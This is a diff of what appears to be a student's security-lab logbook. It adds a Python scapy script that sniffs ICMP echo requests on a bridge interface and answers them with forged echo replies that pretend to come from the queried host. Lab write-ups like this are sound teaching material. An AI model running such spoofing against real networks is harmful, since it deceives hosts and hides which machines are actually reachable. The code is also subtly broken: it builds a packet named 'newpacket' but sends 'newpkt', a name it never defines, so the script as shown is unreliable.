@@ -102,7 +102,31 @@ The capture was started in wireshark and the program was ran, showing the follow
 
 For this task, it was create a file named `sniffing_spoofing.py` to solve us the problem.
 
-![Task 1.4](images/LOGBOOK13/ima)
+```py
+#!/usr/bin/env python3
+
+from scapy.all import *
+
+def spoof(packet):
+
+    if ICMP in packet and packet[ICMP].type == 8:
+        print("-----Original-----")
+        print("Src IP : ", packet[IP].src)
+        print("Dest IP :", packet[IP].dst)
+
+        ip = IP(src=packet[IP].dst, dst=packet[IP].src, ihl=packet[IP].ihl)
+        icmp = ICMP(type=0, id=packet[ICMP].id, seq=packet[ICMP].seq)
+        data = packet[Raw].load
+        newpacket = ip/icmp/data
+
+        print("-----Spoofed-----")
+        print("Source IP : ", newpacket[IP].src)
+        print("Destination IP :", newpacket[IP].dst)
+
+        send(newpkt, verbose=0)
+
+packet = sniff(iface='br-ced6656419bc', filter='icmp and host 1.2.3.4', prn=spoof)
+```
 
 
 
